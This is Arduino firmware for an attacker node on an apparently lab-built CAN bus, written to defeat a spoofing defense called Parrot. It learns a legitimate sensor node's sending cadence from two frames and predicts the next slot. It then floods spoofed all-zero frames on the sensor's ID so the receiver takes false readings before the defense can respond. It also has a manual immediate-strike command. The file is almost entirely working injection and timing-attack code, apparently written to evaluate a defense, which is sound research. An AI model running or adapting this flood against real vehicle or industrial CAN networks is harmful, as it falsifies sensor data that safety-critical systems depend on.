// Node C: cadence-learning attack that pre-empts Parrot's reaction.
// Compiled only when selected in NodeConfig.h.
//
// C watches B's legitimate SENSOR publications, learns the sending cadence
// from two consecutive frames (t1, t2) and predicts the third arrival as
// t3 = t2 + (t2 - t1).  Shortly before the predicted slot C floods 0x120
// frames whose data field is all zeros, with the same DLC as B's samples.
// Because the flood is already on the bus when B's scheduled frame comes
// due, each strike is the FIRST attacker transmission of a new Parrot
// cycle: A processes zero payloads while B's defensive pulse cannot
// intercept an attack that has already begun.
#include "NodeConfig.h"
#if ACTIVE_NODE == NODE_C
#include <Arduino.h>
#include <SPI.h>
#include <EEPROM.h>
#include <mcp2515_can.h>
#include "Protocol.h"

// Shield and serial configuration.
const uint8_t CAN_CS = 9;
const uint8_t CAN_CLOCK = MCP_16MHz;
const uint32_t CAN_SPEED = CAN_500KBPS;
const uint32_t SERIAL_SPEED = 115200;

const char ROLE = 'C';

// Attack timing.  The flood opens PREEMPT_MS before the predicted frame and
// runs for STRIKE_MS so it also swallows late arrivals.  Learning restarts
// after every strike because the defense may shift B's cadence.
const uint32_t PREEMPT_MS = 150;
const uint32_t STRIKE_MS = 500;
const uint32_t STATS_INTERVAL_MS = 2000;
const uint8_t TX_BUFFERS = 3;

// Driver instance for the shield connected through chip-select D9.
mcp2515_can can(CAN_CS);

// State machine for cadence learning and timed zero floods.
enum TrapState : uint8_t {
  TRAP_DISABLED,
  TRAP_LEARN,
  TRAP_ARMED
};

// Counters separate cadence learning from strike outcomes.
struct Counters {
  uint32_t rx, bad, unrelated, overflow;
  uint32_t sensorFrames, cadencesLearned, strikes;
  uint32_t zerosQueued, zeroOk, zeroFail, zeroSkipped;
} counts = {};

// Controller and attack state.
bool ready = false;
bool halted = false;
bool attackEnabled = false;
bool strikeActive = false;
TrapState trapState = TRAP_DISABLED;

// Cadence observations and wrap-safe timestamps.
uint32_t t1 = 0, t2 = 0, predicted = 0;
bool haveT1 = false, haveT2 = false;
uint32_t strikeStartedAt = 0;
uint32_t lastInit = 0;
uint32_t lastDiag = 0;
uint32_t lastStats = 0;

// Error high-water marks make accidental collisions visible in the logs.
uint8_t previousErrorState = 0xff;
uint8_t controllerPeakTec = 0;
uint8_t controllerPeakRec = 0;
uint8_t controllerEflgSeen = 0;

// The all-zero payload: same DLC as B's samples, dominant in every bit.
uint8_t zeroData[8] = {};

// Reads one MCP2515 register through the SPI READ command.
uint8_t regRead(uint8_t address) {
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  digitalWrite(CAN_CS, LOW);
  SPI.transfer(0x03);
  SPI.transfer(address);
  const uint8_t value = SPI.transfer(0);
  digitalWrite(CAN_CS, HIGH);
  SPI.endTransaction();
  return value;
}

// Updates selected MCP2515 register bits without changing the others.
void regModify(uint8_t address, uint8_t mask, uint8_t value) {
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  digitalWrite(CAN_CS, LOW);
  SPI.transfer(0x05);
  SPI.transfer(address);
  SPI.transfer(mask);
  SPI.transfer(value);
  digitalWrite(CAN_CS, HIGH);
  SPI.endTransaction();
}

// Prints a timestamped event tagged with node C.
void event(const __FlashStringHelper *message) {
  Serial.print(millis());
  Serial.print(F(" C "));
  Serial.println(message);
}

// Returns a short name for the current trap state.
const __FlashStringHelper *stateName() {
  if (trapState == TRAP_LEARN) return F("LEARN");
  if (trapState == TRAP_ARMED) return F("ARMED");
  return F("DISABLED");
}

// Prints the controller's error counters and flags.
void printRegisters() {
  Serial.print(F("EFLG=0x")); Serial.print(regRead(0x2d), HEX);
  Serial.print(F(" TEC=")); Serial.print(regRead(0x1c));
  Serial.print(F(" REC=")); Serial.print(regRead(0x1d));
  Serial.print(F(" TX0CTRL=0x")); Serial.println(regRead(0x30), HEX);
}

// Prints the evidence used to judge whether the pre-emption worked.
void printStats() {
  Serial.print(F("STATS C state=")); Serial.print(stateName());
  Serial.print(F(" enabled=")); Serial.print(attackEnabled ? 1 : 0);
  Serial.print(F(" strike=")); Serial.print(strikeActive ? 1 : 0);
  Serial.print(F(" rx=")); Serial.print(counts.rx);
  Serial.print(F(" bad=")); Serial.print(counts.bad);
  Serial.print(F(" unrelated=")); Serial.print(counts.unrelated);
  Serial.print(F(" overflow=")); Serial.print(counts.overflow);
  Serial.print(F(" sensor_frames=")); Serial.print(counts.sensorFrames);
  Serial.print(F(" cadences=")); Serial.print(counts.cadencesLearned);
  Serial.print(F(" strikes=")); Serial.print(counts.strikes);
  Serial.print(F(" zeros_queued=")); Serial.print(counts.zerosQueued);
  Serial.print(F(" zero_ok=")); Serial.print(counts.zeroOk);
  Serial.print(F(" zero_fail=")); Serial.print(counts.zeroFail);
  Serial.print(F(" zero_skip=")); Serial.print(counts.zeroSkipped);
  Serial.print(F(" peak_TEC=")); Serial.print(controllerPeakTec);
  Serial.print(F(" peak_REC=")); Serial.print(controllerPeakRec);
  Serial.print(F(" EFLG_seen=0x")); Serial.println(controllerEflgSeen, HEX);
  if (ready) printRegisters();
}

// Preserves short error-counter changes that periodic logs could miss.
void sampleControllerHighWater() {
  const uint8_t tec = regRead(0x1c);
  const uint8_t rec = regRead(0x1d);
  const uint8_t eflg = regRead(0x2d);
  if (tec > controllerPeakTec) controllerPeakTec = tec;
  if (rec > controllerPeakRec) controllerPeakRec = rec;
  controllerEflgSeen |= eflg;
}

// Resets and configures the MCP2515 with default retransmission behavior.
bool initializeCan() {
  pinMode(10, OUTPUT); digitalWrite(10, HIGH);
  pinMode(4, OUTPUT); digitalWrite(4, HIGH);
  if (can.begin(CAN_SPEED, CAN_CLOCK) != CAN_OK) {
    event(F("CAN_INIT_FAIL"));
    return false;
  }
  if (can.setMode(MODE_NORMAL) != CAN_OK) return false;
  if (can.init_Mask(0, 0, 0) != CAN_OK ||
      can.init_Mask(1, 0, 0) != CAN_OK) return false;
  for (uint8_t i = 0; i < 6; ++i) {
    if (can.init_Filt(i, 0, 0) != CAN_OK) return false;
  }
  regModify(0x60, 0x64, 0x04);
  regModify(0x70, 0x60, 0);
  regModify(0x2c, 0x1c, 0);
  halted = false;
  previousErrorState = 0xff;
  event(F("CAN_READY 11bit 500k DLC8"));
  return true;
}

// Fills any idle TX buffer with one all-zero frame; returns true when at
// least one buffer accepted a frame.
bool pumpZeros() {
  bool queuedAny = false;
  for (uint8_t i = 0; i < TX_BUFFERS; ++i) {
    if (can.trySendMsgBuf(Lab::SENSOR_ID, 0, 0, Lab::DLC, zeroData, i) == CAN_OK) {
      ++counts.zerosQueued;
      queuedAny = true;
    } else {
      ++counts.zeroSkipped;
    }
  }
  return queuedAny;
}

// Harvests completed zero transmissions so the buffers keep cycling.
void serviceStrike() {
  const uint8_t intf = regRead(0x2c);
  const uint8_t iflags[TX_BUFFERS] = {0x04, 0x08, 0x10};
  const uint8_t ctrls[TX_BUFFERS] = {0x30, 0x40, 0x50};
  for (uint8_t i = 0; i < TX_BUFFERS; ++i) {
    if (!(intf & iflags[i])) continue;
    const uint8_t ctrl = regRead(ctrls[i]);
    regModify(0x2c, iflags[i], 0);
    if (!(ctrl & 0x50)) ++counts.zeroOk;
    else ++counts.zeroFail;
  }
}

// Records B's legitimate publications and builds the rolling (t1, t2) pair.
void observeSensor(uint32_t now) {
  ++counts.sensorFrames;
  if (strikeActive) return;  // traffic during a strike teaches bad cadence
  if (!haveT1) {
    t1 = now;
    haveT1 = true;
    return;
  }
  if (!haveT2) {
    t2 = now;
    haveT2 = true;
    predicted = t2 + (uint32_t)(t2 - t1);
    ++counts.cadencesLearned;
    trapState = TRAP_ARMED;
    Serial.print(now);
    Serial.print(F(" C CADENCE_LEARNED period_ms="));
    Serial.println(t2 - t1);
    return;
  }
  t1 = t2;
  t2 = now;
  predicted = t2 + (uint32_t)(t2 - t1);
}

// Drains RX quickly and classifies SENSOR traffic on the shared ID.
void receiveFrames(uint32_t now) {
  for (uint8_t n = 0; n < 24 && can.checkReceive() == CAN_MSGAVAIL; ++n) {
    uint8_t len = 0;
    uint8_t data[8] = {};
    if (can.readMsgBuf(&len, data) != CAN_OK) {
      ++counts.bad;
      continue;
    }
    const uint32_t id = can.getCanId();
    const bool ext = can.isExtendedFrame();
    const bool rtr = can.isRemoteRequest();
    ++counts.rx;
    if (ext || rtr) {
      ++counts.bad;
      continue;
    }
    if (id != Lab::SENSOR_ID) {
      ++counts.unrelated;
      continue;
    }
    if (len != Lab::DLC) {
      ++counts.bad;
      continue;
    }
    // C ignores its own echoed zeros (normal mode never delivers a node's
    // own frames, so any zero frame here came from B's pulse) and learns
    // only from payloads that look like B's legitimate samples.
    if (!Lab::validSensor(data)) continue;
    observeSensor(now);
  }
}

// Advances cadence learning, pre-emption windows, and active strikes.
void serviceTrap(uint32_t now) {
  if (trapState == TRAP_DISABLED) return;

  if (strikeActive) {
    pumpZeros();
    serviceStrike();
    if (Lab::elapsed(now, strikeStartedAt, STRIKE_MS)) {
      strikeActive = false;
      event(F("STRIKE_END relearning"));
      // Discard stale timings: B's cadence may have shifted mid-strike.
      haveT1 = false;
      haveT2 = false;
      trapState = TRAP_LEARN;
    }
    return;
  }

  if (trapState == TRAP_LEARN || !haveT2) return;

  if (trapState == TRAP_ARMED && now + PREEMPT_MS >= predicted) {
    strikeActive = true;
    strikeStartedAt = now;
    ++counts.strikes;
    Serial.print(now);
    Serial.print(F(" C STRIKE_START predicted_in_ms="));
    Serial.println(predicted - now);
    pumpZeros();
  }
}

// Reports CAN error-state changes and clears receive-overflow flags.
void diagnostics(uint32_t now) {
  if (!Lab::elapsed(now, lastDiag, 2)) return;
  lastDiag = now;
  const uint8_t flags = regRead(0x2d);
  const uint8_t state = flags & 0x3f;
  if (state != previousErrorState) {
    previousErrorState = state;
    event(F("CAN_STATE_CHANGED"));
    printRegisters();
  }
  if (flags & 0xc0) {
    ++counts.overflow;
    regModify(0x2d, 0xc0, 0);
  }
  if ((flags & 0x20) && !halted) {
    halted = true;
    attackEnabled = false;
    strikeActive = false;
    trapState = TRAP_DISABLED;
    event(F("UNEXPECTED_BUS_OFF"));
  }
}

// Prints the serial commands supported by this attack firmware.
void help() {
  event(F("h help | s stats | r reinit CAN"));
  event(F("C: a toggle cadence trap | 1 immediate strike"));
}

// Reads and executes at most one serial command per loop iteration.
void commands() {
  if (!Serial.available()) return;
  const char command = Serial.read();
  if (command == 'h') help();
  if (command == 's') printStats();
  if (command == 'r') {
    attackEnabled = false;
    strikeActive = false;
    trapState = TRAP_DISABLED;
    ready = initializeCan();
    lastInit = millis();
    event(F("CAN_REINIT"));
  }
  if (command == 'a') {
    attackEnabled = !attackEnabled;
    if (attackEnabled) {
      trapState = TRAP_LEARN;
      haveT1 = false;
      haveT2 = false;
      event(F("CADENCE_TRAP_ON listening for B's cadence"));
    } else {
      strikeActive = false;
      trapState = TRAP_DISABLED;
      event(F("CADENCE_TRAP_OFF"));
    }
  }
  if (command == '1' && !strikeActive) {
    // Manual one-shot: strike now regardless of the learned cadence.
    strikeActive = true;
    strikeStartedAt = millis();
    ++counts.strikes;
    event(F("MANUAL_STRIKE_START"));
    pumpZeros();
  }
}

// Initializes Serial, the attack session, and the CAN controller.
void setup() {
  Serial.begin(SERIAL_SPEED);
  EEPROM.get(0, bootSession);
  bootSession = (bootSession == 0xffffU || bootSession == 0xfffeU) ?
    1 : uint16_t(bootSession + 1);
  if (!bootSession) bootSession = 1;
  EEPROM.put(0, bootSession);
  event(F("NODE_INIT CADENCE_TRAP"));
  ready = initializeCan();
  lastInit = millis();
  help();
}

// Cooperatively learns cadence, pre-empts B's slot, and floods zeros.
void loop() {
  uint32_t now = millis();
  commands();
  if (!ready) {
    if (Lab::elapsed(now, lastInit, 2000)) {
      lastInit = now;
      ready = initializeCan();
    }
    return;
  }

  sampleControllerHighWater();
  diagnostics(now);
  if (strikeActive) {
    serviceTrap(now);
    return;  // no Serial work inside a strike: keep the flood dense
  }
  receiveFrames(millis());
  serviceTrap(millis());

  if (Lab::elapsed(millis(), lastStats, STATS_INTERVAL_MS)) {
    lastStats = millis();
    printStats();
  }
}
#endif  // ACTIVE_NODE == NODE_C
